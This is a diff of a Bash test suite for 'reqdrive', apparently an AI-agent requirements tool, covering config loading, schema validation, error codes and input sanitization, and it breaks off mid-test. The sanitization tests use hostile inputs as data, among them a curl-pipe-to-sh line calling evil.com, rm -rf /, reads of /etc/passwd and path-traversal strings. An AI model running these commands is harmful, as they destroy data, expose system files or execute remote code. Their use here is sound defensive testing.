@@ -61,9 +61,9 @@ fi
 # ─────────────────────────────────────────────
 # Test: Config loading
 # ─────────────────────────────────────────────
-echo "--- Config Tests ---"
+echo "--- Config: reqdrive_find_manifest ---"
 
-# Test: reqdrive_find_manifest finds manifest
+# Test: reqdrive_find_manifest finds manifest in current dir
 (
   cd "$TEST_TEMP"
   cat > reqdrive.json <<'EOF'
@@ -73,7 +73,7 @@ EOF
   result=$(reqdrive_find_manifest)
   [ "$result" = "$TEST_TEMP/reqdrive.json" ]
 )
-test_result "config: finds manifest in current dir" $?
+test_result "find_manifest: finds manifest in current dir" $?
 
 # Test: reqdrive_find_manifest finds manifest in parent
 (
@@ -87,9 +87,22 @@ EOF
   result=$(reqdrive_find_manifest)
   [ "$result" = "$TEST_TEMP/reqdrive.json" ]
 )
-test_result "config: finds manifest in parent dir" $?
+test_result "find_manifest: finds manifest in parent dir" $?
 
-# Test: reqdrive_load_config loads settings
+# Test: reqdrive_find_manifest returns 1 when no manifest exists
+(
+  tmpdir=$(mktemp -d)
+  trap "rm -rf $tmpdir" EXIT
+  cd "$tmpdir"
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  ! reqdrive_find_manifest 2>/dev/null
+)
+test_result "find_manifest: returns 1 when no manifest found" $?
+
+echo ""
+echo "--- Config: reqdrive_load_config ---"
+
+# Test: reqdrive_load_config loads all settings
 (
   cd "$TEST_TEMP"
   cat > reqdrive.json <<'EOF'
@@ -104,9 +117,9 @@ EOF
   [ "$REQDRIVE_BASE_BRANCH" = "develop" ] &&
   [ "$REQDRIVE_PROJECT_NAME" = "my-project" ]
 )
-test_result "config: loads all settings" $?
+test_result "load_config: loads all settings" $?
 
-# Test: reqdrive_load_config uses defaults
+# Test: reqdrive_load_config uses defaults for missing fields
 (
   cd "$TEST_TEMP"
   cat > reqdrive.json <<'EOF'
@@ -119,7 +132,107 @@ EOF
   [ "$REQDRIVE_MAX_ITERATIONS" = "10" ] &&
   [ "$REQDRIVE_BASE_BRANCH" = "main" ]
 )
-test_result "config: uses defaults for missing fields" $?
+test_result "load_config: uses defaults for missing fields" $?
+
+# Test: reqdrive_load_config sets REQDRIVE_MANIFEST to manifest path
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_MANIFEST" = "$TEST_TEMP/reqdrive.json" ]
+)
+test_result "load_config: sets REQDRIVE_MANIFEST path" $?
+
+# Test: reqdrive_load_config sets REQDRIVE_PROJECT_ROOT to manifest dir
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{}
+EOF
+  mkdir -p subdir
+  cd subdir
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_PROJECT_ROOT" = "$TEST_TEMP" ]
+)
+test_result "load_config: sets REQDRIVE_PROJECT_ROOT to manifest dir" $?
+
+# Test: reqdrive_load_config joins prLabels with commas
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{"prLabels":["agent-generated","needs-review","auto"]}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_PR_LABELS" = "agent-generated,needs-review,auto" ]
+)
+test_result "load_config: joins prLabels with commas" $?
+
+# Test: reqdrive_load_config defaults prLabels to agent-generated
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_PR_LABELS" = "agent-generated" ]
+)
+test_result "load_config: defaults prLabels to agent-generated" $?
+
+# Test: reqdrive_load_config defaults testCommand to empty
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_TEST_COMMAND" = "" ]
+)
+test_result "load_config: defaults testCommand to empty string" $?
+
+# Test: reqdrive_load_config defaults projectName to empty
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  [ "$REQDRIVE_PROJECT_NAME" = "" ]
+)
+test_result "load_config: defaults projectName to empty string" $?
+
+# Test: reqdrive_load_config exits when no manifest found
+(
+  tmpdir=$(mktemp -d)
+  trap "rm -rf $tmpdir" EXIT
+  cd "$tmpdir"
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  output=$(reqdrive_load_config 2>&1) && exit 1
+  echo "$output" | grep -q "No reqdrive.json found"
+)
+test_result "load_config: exits with error when no manifest" $?
+
+# Test: reqdrive_load_config exits on incompatible schema version
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{"version":"9.0.0"}
+EOF
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  output=$(reqdrive_load_config 2>&1) && exit 1
+  echo "$output" | grep -q "Incompatible config version"
+)
+test_result "load_config: exits on incompatible schema version" $?
+
+echo ""
+echo "--- Config: reqdrive_get_req_file ---"
 
 # Test: reqdrive_get_req_file finds requirement
 (
@@ -134,7 +247,51 @@ EOF
   result=$(reqdrive_get_req_file "REQ-01")
   [ -n "$result" ] && [ -f "$result" ]
 )
-test_result "config: reqdrive_get_req_file finds requirement" $?
+test_result "get_req_file: finds matching requirement" $?
+
+# Test: reqdrive_get_req_file returns 1 when no match
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{"requirementsDir":"docs/requirements"}
+EOF
+  mkdir -p docs/requirements
+  # Only REQ-01 exists, ask for REQ-99
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  ! reqdrive_get_req_file "REQ-99" 2>/dev/null
+)
+test_result "get_req_file: returns 1 when no match" $?
+
+# Test: reqdrive_get_req_file returns path including filename
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{"requirementsDir":"docs/requirements"}
+EOF
+  mkdir -p docs/requirements
+  echo "# REQ-02" > docs/requirements/REQ-02-another-feature.md
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  result=$(reqdrive_get_req_file "REQ-02")
+  [[ "$result" == *"REQ-02-another-feature.md" ]]
+)
+test_result "get_req_file: returns full path to matched file" $?
+
+# Test: reqdrive_get_req_file uses configured requirementsDir
+(
+  cd "$TEST_TEMP"
+  cat > reqdrive.json <<'EOF'
+{"requirementsDir":"specs"}
+EOF
+  mkdir -p specs
+  echo "# REQ-05" > specs/REQ-05-custom-dir.md
+  source "$REQDRIVE_ROOT/lib/config.sh"
+  reqdrive_load_config
+  result=$(reqdrive_get_req_file "REQ-05")
+  [[ "$result" == *"specs/REQ-05-custom-dir.md" ]]
+)
+test_result "get_req_file: respects custom requirementsDir" $?
 
 echo ""
 echo "--- Validation Tests ---"
@@ -167,50 +324,383 @@ test_result "validate: passes for valid manifest" $?
 test_result "validate: fails for invalid JSON" $?
 
 echo ""
-echo "--- Sanitization Tests ---"
+echo "--- Sanitize: sanitize_for_prompt ---"
 
-# Test: sanitize_for_prompt escapes dangerous patterns
+# Test: sanitize_for_prompt escapes backticks and dollar signs
 (
   source "$REQDRIVE_ROOT/lib/sanitize.sh"
   input='echo $(whoami) and `id`'
   result=$(sanitize_for_prompt "$input")
-  # Should escape $ and backticks - result should contain \$ instead of $(
-  # and ' instead of `
   echo "$result" | grep -qF '\$' && echo "$result" | grep -qF "'"
 )
-test_result "sanitize: escapes command substitution" $?
+test_result "sanitize_for_prompt: escapes backticks and dollar signs" $?
 
-# Test: sanitize_label removes dangerous characters
+# Test: sanitize_for_prompt passes clean content through unchanged
 (
   source "$REQDRIVE_ROOT/lib/sanitize.sh"
-  input='label;rm -rf /'
-  result=$(sanitize_label "$input")
-  # Should not contain semicolon - check that result doesn't have ;
-  [ "$(echo "$result" | grep -c ';')" -eq 0 ]
+  input='Hello world, this is plain text with no special chars.'
+  result=$(sanitize_for_prompt "$input")
+  [ "$result" = "$input" ]
 )
-test_result "sanitize: removes shell metacharacters from labels" $?
+test_result "sanitize_for_prompt: clean content passes through unchanged" $?
 
-# Test: validate_requirement_content warns on suspicious patterns
+# Test: sanitize_for_prompt handles empty input
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_for_prompt "")
+  [ -z "$result" ]
+)
+test_result "sanitize_for_prompt: empty input returns empty" $?
+
+# Test: sanitize_for_prompt escapes ${VAR} expansion
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  input='use ${HOME} for path'
+  result=$(sanitize_for_prompt "$input")
+  # Result should be: use \${HOME} for path
+  echo "$result" | grep -qF '\${'
+)
+test_result "sanitize_for_prompt: escapes \${VAR} expansion" $?
+
+echo ""
+echo "--- Sanitize: sanitize_label ---"
+
+# Test: sanitize_label passes clean label through
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label "agent-generated")
+  [ "$result" = "agent-generated" ]
+)
+test_result "sanitize_label: clean label passes through" $?
+
+# Test: sanitize_label strips leading/trailing whitespace
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label "  my-label  ")
+  [ "$result" = "my-label" ]
+)
+test_result "sanitize_label: strips whitespace" $?
+
+# Test: sanitize_label removes semicolons
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label;rm -rf /')
+  [[ "$result" != *";"* ]]
+)
+test_result "sanitize_label: removes semicolons" $?
+
+# Test: sanitize_label removes pipes
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label|cat /etc/passwd')
+  [[ "$result" != *"|"* ]]
+)
+test_result "sanitize_label: removes pipes" $?
+
+# Test: sanitize_label removes ampersands
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label&& echo pwned')
+  [[ "$result" != *"&"* ]]
+)
+test_result "sanitize_label: removes ampersands" $?
+
+# Test: sanitize_label removes redirects
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label > /tmp/out < /etc/passwd')
+  [[ "$result" != *">"* ]] && [[ "$result" != *"<"* ]]
+)
+test_result "sanitize_label: removes redirect characters" $?
+
+# Test: sanitize_label removes dollar signs
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label$HOME')
+  [[ "$result" != *'$'* ]]
+)
+test_result "sanitize_label: removes dollar signs" $?
+
+# Test: sanitize_label removes backslashes
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'label\\path')
+  [[ "$result" != *'\\'* ]]
+)
+test_result "sanitize_label: removes backslashes" $?
+
+# Test: sanitize_label replaces double quotes with single quotes
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'say "hello"')
+  [[ "$result" != *'"'* ]] && [[ "$result" == *"'"* ]]
+)
+test_result "sanitize_label: replaces double quotes with single" $?
+
+# Test: sanitize_label replaces backticks with single quotes
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label 'run `cmd`')
+  [[ "$result" != *'`'* ]] && [[ "$result" == *"'"* ]]
+)
+test_result "sanitize_label: replaces backticks with single quotes" $?
+
+# Test: sanitize_label truncates to 50 characters
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  long_label=$(printf 'a%.0s' {1..70})
+  result=$(sanitize_label "$long_label")
+  [ "${#result}" -eq 50 ]
+)
+test_result "sanitize_label: truncates to 50 chars" $?
+
+# Test: sanitize_label handles empty input
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  result=$(sanitize_label "")
+  [ -z "$result" ]
+)
+test_result "sanitize_label: empty input returns empty" $?
+
+echo ""
+echo "--- Sanitize: validate_requirement_content ---"
+
+# Test: validate_requirement_content returns 0 for clean content
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  validate_requirement_content "This is a normal requirement document." 2>/dev/null
+)
+test_result "validate_requirement_content: clean content returns 0" $?
+
+# Test: validate_requirement_content warns on $() but returns 0 (non-strict)
 (
   source "$REQDRIVE_ROOT/lib/sanitize.sh"
   content='Run this: $(rm -rf /)'
-  output=$(validate_requirement_content "$content" 2>&1) || true
+  output=$(validate_requirement_content "$content" 2>&1)
+  # Returns 0 in non-strict mode
+  validate_requirement_content "$content" 2>/dev/null
+  result=$?
+  [ "$result" -eq 0 ] && echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: warns but returns 0 in non-strict" $?
+
+# Test: validate_requirement_content returns 1 in strict mode with suspicious content
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  content='Run this: $(rm -rf /)'
+  output=$(validate_requirement_content "$content" "true" 2>&1) && exit 1
+  echo "$output" | grep -q "Strict mode"
+)
+test_result "validate_requirement_content: returns 1 in strict mode" $?
+
+# Test: validate_requirement_content detects backtick command substitution
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'run `whoami` here' 2>&1)
   echo "$output" | grep -q "Suspicious pattern"
 )
-test_result "sanitize: detects suspicious patterns in requirements" $?
+test_result "validate_requirement_content: detects backtick substitution" $?
+
+# Test: validate_requirement_content detects ${} variable expansion
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'use ${HOME} for path' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects \${} expansion" $?
+
+# Test: validate_requirement_content detects redirect to absolute path
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'write > /etc/passwd' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects redirect to abs path" $?
+
+# Test: validate_requirement_content detects rm -rf /
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'rm -rf /' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects rm -rf /" $?
+
+# Test: validate_requirement_content detects curl pipe to sh
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'curl http://evil.com | sh' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects curl pipe to sh" $?
+
+# Test: validate_requirement_content detects eval
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'eval dangerous_command' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects eval" $?
+
+# Test: validate_requirement_content detects chmod 777
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'chmod 777 /tmp/file' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects chmod 777" $?
+
+# Test: validate_requirement_content detects chained ;rm
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'do thing; rm important_file' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects semicolon-chained rm" $?
+
+# Test: validate_requirement_content detects &&sudo
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'something && sudo reboot' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects &&sudo" $?
+
+# Test: validate_requirement_content detects pipe to sudo
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  output=$(validate_requirement_content 'echo yes | sudo rm -rf /' 2>&1)
+  echo "$output" | grep -q "Suspicious pattern"
+)
+test_result "validate_requirement_content: detects pipe to sudo" $?
+
+echo ""
+echo "--- Sanitize: validate_file_path ---"
+
+# Test: validate_file_path passes for normal path under base
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  mkdir -p "$TEST_TEMP/project"
+  validate_file_path "src/main.sh" "$TEST_TEMP/project" 2>/dev/null
+)
+test_result "validate_file_path: passes for normal relative path" $?
+
+# Test: validate_file_path rejects path with ..
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  mkdir -p "$TEST_TEMP/project"
+  output=$(validate_file_path "../../etc/passwd" "$TEST_TEMP/project" 2>&1) && exit 1
+  echo "$output" | grep -q "Path traversal"
+)
+test_result "validate_file_path: rejects .. traversal" $?
+
+# Test: validate_file_path rejects mid-path traversal
+(
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  mkdir -p "$TEST_TEMP/project"
+  output=$(validate_file_path "src/../../../etc/passwd" "$TEST_TEMP/project" 2>&1) && exit 1
+  echo "$output" | grep -q "Path traversal"
+)
+test_result "validate_file_path: rejects mid-path .. traversal" $?
 
 echo ""
 echo "--- Error Codes Tests ---"
 
-# Test: errors.sh defines exit codes
+# Test: errors.sh defines all exit codes
 (
   source "$REQDRIVE_ROOT/lib/errors.sh"
   [ "$EXIT_SUCCESS" = "0" ] &&
   [ "$EXIT_GENERAL_ERROR" = "1" ] &&
   [ "$EXIT_MISSING_DEPENDENCY" = "2" ] &&
+  [ "$EXIT_CONFIG_ERROR" = "3" ] &&
+  [ "$EXIT_GIT_ERROR" = "4" ] &&
+  [ "$EXIT_AGENT_ERROR" = "5" ] &&
+  [ "$EXIT_PR_ERROR" = "6" ] &&
+  [ "$EXIT_USER_ABORT" = "7" ] &&
   [ "$EXIT_PREFLIGHT_FAILED" = "8" ]
 )
-test_result "errors: defines standard exit codes" $?
+test_result "errors: defines all exit codes (0-8)" $?
+
+# Test: EXIT_MESSAGES has entry for every exit code
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  [ -n "${EXIT_MESSAGES[0]}" ] &&
+  [ -n "${EXIT_MESSAGES[1]}" ] &&
+  [ -n "${EXIT_MESSAGES[2]}" ] &&
+  [ -n "${EXIT_MESSAGES[3]}" ] &&
+  [ -n "${EXIT_MESSAGES[4]}" ] &&
+  [ -n "${EXIT_MESSAGES[5]}" ] &&
+  [ -n "${EXIT_MESSAGES[6]}" ] &&
+  [ -n "${EXIT_MESSAGES[7]}" ] &&
+  [ -n "${EXIT_MESSAGES[8]}" ]
+)
+test_result "errors: EXIT_MESSAGES covers all codes" $?
+
+# Test: get_exit_message returns known message
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  [ "$(get_exit_message 0)" = "Success" ] &&
+  [ "$(get_exit_message 3)" = "Configuration error" ] &&
+  [ "$(get_exit_message 8)" = "Pre-flight checks failed" ]
+)
+test_result "errors: get_exit_message returns correct messages" $?
+
+# Test: get_exit_message returns fallback for unknown code
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  [ "$(get_exit_message 99)" = "Unknown error" ]
+)
+test_result "errors: get_exit_message returns 'Unknown error' for unknown code" $?
+
+# Test: die exits with given code and custom message
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  output=$(die 3 "bad config" 2>&1) || code=$?
+  [ "$code" = "3" ] &&
+  echo "$output" | grep -qF "[ERROR] bad config"
+)
+test_result "errors: die exits with code and custom message" $?
+
+# Test: die uses default message from EXIT_MESSAGES when no msg given
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  output=$(die 5 2>&1) || code=$?
+  [ "$code" = "5" ] &&
+  echo "$output" | grep -qF "[ERROR] Agent execution failed"
+)
+test_result "errors: die uses EXIT_MESSAGES when no custom message" $?
+
+# Test: die defaults to exit code 1 with no arguments
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  output=$(die 2>&1) || code=$?
+  [ "$code" = "1" ]
+)
+test_result "errors: die defaults to exit code 1" $?
+
+# Test: die_on_error does nothing after success
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  true
+  die_on_error "should not fire"
+  # If we get here, it didn't exit
+)
+test_result "errors: die_on_error is silent after success" $?
+
+# Test: die_on_error exits after failure
+(
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  # Subshell: force $? to non-zero then call die_on_error
+  output=$(
+    bash -c '
+      source "'"$REQDRIVE_ROOT"'/lib/errors.sh"
+      false
+      die_on_error "it broke"
+    ' 2>&1
+  ) || code=$?
+  [ "$code" = "1" ] &&
+  echo "$output" | grep -qF "it broke"
+)
+test_result "errors: die_on_error exits after failure" $?
 
 echo ""
 echo "--- Preflight Tests ---"
@@ -251,7 +741,7 @@ test_result "preflight: check_clean_working_tree passes on clean repo" $?
 test_result "preflight: check_clean_working_tree fails on dirty repo" $?
 
 echo ""
-echo "--- Schema Version Tests ---"
+echo "--- Schema: check_schema_version ---"
 
 # Test: check_schema_version warns on missing version
 (
@@ -268,7 +758,7 @@ test_result "schema: check_schema_version warns on missing version" $?
   echo '{"version":"0.3.0"}' > "$TEST_TEMP/good-version.json"
   check_schema_version "$TEST_TEMP/good-version.json" 2>/dev/null
 )
-test_result "schema: check_schema_version passes on correct version" $?
+test_result "schema: check_schema_version passes on exact version" $?
 
 # Test: check_schema_version errors on incompatible major version
 (
@@ -276,7 +766,274 @@ test_result "schema: check_schema_version passes on correct version" $?
   echo '{"version":"9.0.0"}' > "$TEST_TEMP/bad-version.json"
   ! check_schema_version "$TEST_TEMP/bad-version.json" 2>/dev/null
 )
-test_result "schema: check_schema_version errors on bad major version" $?
+test_result "schema: check_schema_version rejects incompatible major" $?
+
+# Test: check_schema_version passes for nonexistent file
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  check_schema_version "$TEST_TEMP/nonexistent.json" 2>/dev/null
+)
+test_result "schema: check_schema_version passes for nonexistent file" $?
+
+# Test: check_schema_version accepts older minor (0.2.0 same major)
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"version":"0.2.0"}' > "$TEST_TEMP/older-minor.json"
+  check_schema_version "$TEST_TEMP/older-minor.json" 2>/dev/null
+)
+test_result "schema: check_schema_version accepts older minor (0.2.0)" $?
+
+# Test: check_schema_version warns on newer minor (0.9.0)
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"version":"0.9.0"}' > "$TEST_TEMP/newer-minor.json"
+  output=$(check_schema_version "$TEST_TEMP/newer-minor.json" 2>&1)
+  # Should still return 0 (warning, not error), but warn on stderr
+  check_schema_version "$TEST_TEMP/newer-minor.json" 2>/dev/null &&
+  echo "$output" | grep -q "newer than supported"
+)
+test_result "schema: check_schema_version warns on newer minor (0.9.0)" $?
+
+# Test: check_schema_version accepts patch difference (0.3.1)
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"version":"0.3.1"}' > "$TEST_TEMP/patch-diff.json"
+  check_schema_version "$TEST_TEMP/patch-diff.json" 2>/dev/null
+)
+test_result "schema: check_schema_version accepts patch difference (0.3.1)" $?
+
+echo ""
+echo "--- Schema: validate_config_schema ---"
+
+# Test: validate_config_schema passes for valid config fixture
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  validate_config_schema "$REQDRIVE_ROOT/tests/fixtures/valid-manifest.json" 2>/dev/null
+)
+test_result "schema: validate_config_schema passes for valid config" $?
+
+# Test: validate_config_schema passes for empty object
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{}' > "$TEST_TEMP/empty.json"
+  validate_config_schema "$TEST_TEMP/empty.json" 2>/dev/null
+)
+test_result "schema: validate_config_schema passes for empty object" $?
+
+# Test: validate_config_schema fails for invalid JSON
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo 'not json' > "$TEST_TEMP/bad.json"
+  ! validate_config_schema "$TEST_TEMP/bad.json" 2>/dev/null
+)
+test_result "schema: validate_config_schema rejects invalid JSON" $?
+
+# Test: validate_config_schema fails when requirementsDir is wrong type
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"requirementsDir": 123}' > "$TEST_TEMP/bad-type.json"
+  output=$(validate_config_schema "$TEST_TEMP/bad-type.json" 2>&1) && exit 1
+  echo "$output" | grep -q "requirementsDir must be a string"
+)
+test_result "schema: validate_config_schema rejects non-string requirementsDir" $?
+
+# Test: validate_config_schema fails when maxIterations is wrong type
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"maxIterations": "ten"}' > "$TEST_TEMP/bad-iter.json"
+  output=$(validate_config_schema "$TEST_TEMP/bad-iter.json" 2>&1) && exit 1
+  echo "$output" | grep -q "maxIterations must be a number"
+)
+test_result "schema: validate_config_schema rejects non-number maxIterations" $?
+
+# Test: validate_config_schema fails when prLabels is wrong type
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"prLabels": "not-an-array"}' > "$TEST_TEMP/bad-labels.json"
+  output=$(validate_config_schema "$TEST_TEMP/bad-labels.json" 2>&1) && exit 1
+  echo "$output" | grep -q "prLabels must be an array"
+)
+test_result "schema: validate_config_schema rejects non-array prLabels" $?
+
+# Test: validate_config_schema reports multiple errors at once
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  output=$(validate_config_schema "$REQDRIVE_ROOT/tests/fixtures/invalid-manifest-missing-fields.json" 2>&1) && exit 1
+  echo "$output" | grep -q "requirementsDir must be a string" &&
+  echo "$output" | grep -q "maxIterations must be a number" &&
+  echo "$output" | grep -q "prLabels must be an array"
+)
+test_result "schema: validate_config_schema reports multiple type errors" $?
+
+echo ""
+echo "--- Schema: validate_prd_schema ---"
+
+# Test: validate_prd_schema passes for valid PRD fixture
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  validate_prd_schema "$REQDRIVE_ROOT/tests/fixtures/valid-prd.json" 2>/dev/null
+)
+test_result "schema: validate_prd_schema passes for valid PRD" $?
+
+# Test: validate_prd_schema rejects invalid JSON
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo 'not json' > "$TEST_TEMP/bad-prd.json"
+  ! validate_prd_schema "$TEST_TEMP/bad-prd.json" 2>/dev/null
+)
+test_result "schema: validate_prd_schema rejects invalid JSON" $?
+
+# Test: validate_prd_schema rejects missing project field
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"sourceReq":"REQ-01","userStories":[]}' > "$TEST_TEMP/no-project.json"
+  output=$(validate_prd_schema "$TEST_TEMP/no-project.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing required field: project"
+)
+test_result "schema: validate_prd_schema rejects missing project" $?
+
+# Test: validate_prd_schema rejects missing sourceReq field
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"project":"Test","userStories":[]}' > "$TEST_TEMP/no-req.json"
+  output=$(validate_prd_schema "$TEST_TEMP/no-req.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing required field: sourceReq"
+)
+test_result "schema: validate_prd_schema rejects missing sourceReq" $?
+
+# Test: validate_prd_schema rejects missing userStories
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  output=$(validate_prd_schema "$REQDRIVE_ROOT/tests/fixtures/invalid-prd-missing-stories.json" 2>&1) && exit 1
+  echo "$output" | grep -q "userStories"
+)
+test_result "schema: validate_prd_schema rejects missing userStories" $?
+
+# Test: validate_prd_schema rejects non-array userStories
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"project":"Test","sourceReq":"REQ-01","userStories":"not-array"}' > "$TEST_TEMP/bad-stories.json"
+  output=$(validate_prd_schema "$TEST_TEMP/bad-stories.json" 2>&1) && exit 1
+  echo "$output" | grep -q "userStories must be an array"
+)
+test_result "schema: validate_prd_schema rejects non-array userStories" $?
+
+# Test: validate_prd_schema passes with empty stories array
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"project":"Test","sourceReq":"REQ-01","userStories":[]}' > "$TEST_TEMP/empty-stories.json"
+  validate_prd_schema "$TEST_TEMP/empty-stories.json" 2>/dev/null
+)
+test_result "schema: validate_prd_schema passes with empty stories array" $?
+
+# Test: validate_prd_schema rejects story missing id
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  cat > "$TEST_TEMP/no-id.json" <<'EOF'
+{"project":"T","sourceReq":"REQ-01","userStories":[{"title":"X","acceptanceCriteria":["a"]}]}
+EOF
+  output=$(validate_prd_schema "$TEST_TEMP/no-id.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing id"
+)
+test_result "schema: validate_prd_schema rejects story missing id" $?
+
+# Test: validate_prd_schema rejects story missing title
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  cat > "$TEST_TEMP/no-title.json" <<'EOF'
+{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","acceptanceCriteria":["a"]}]}
+EOF
+  output=$(validate_prd_schema "$TEST_TEMP/no-title.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing title"
+)
+test_result "schema: validate_prd_schema rejects story missing title" $?
+
+# Test: validate_prd_schema rejects story missing acceptanceCriteria
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  cat > "$TEST_TEMP/no-ac.json" <<'EOF'
+{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X"}]}
+EOF
+  output=$(validate_prd_schema "$TEST_TEMP/no-ac.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing acceptanceCriteria"
+)
+test_result "schema: validate_prd_schema rejects story missing acceptanceCriteria" $?
+
+# Test: validate_prd_schema rejects non-array acceptanceCriteria
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  cat > "$TEST_TEMP/bad-ac.json" <<'EOF'
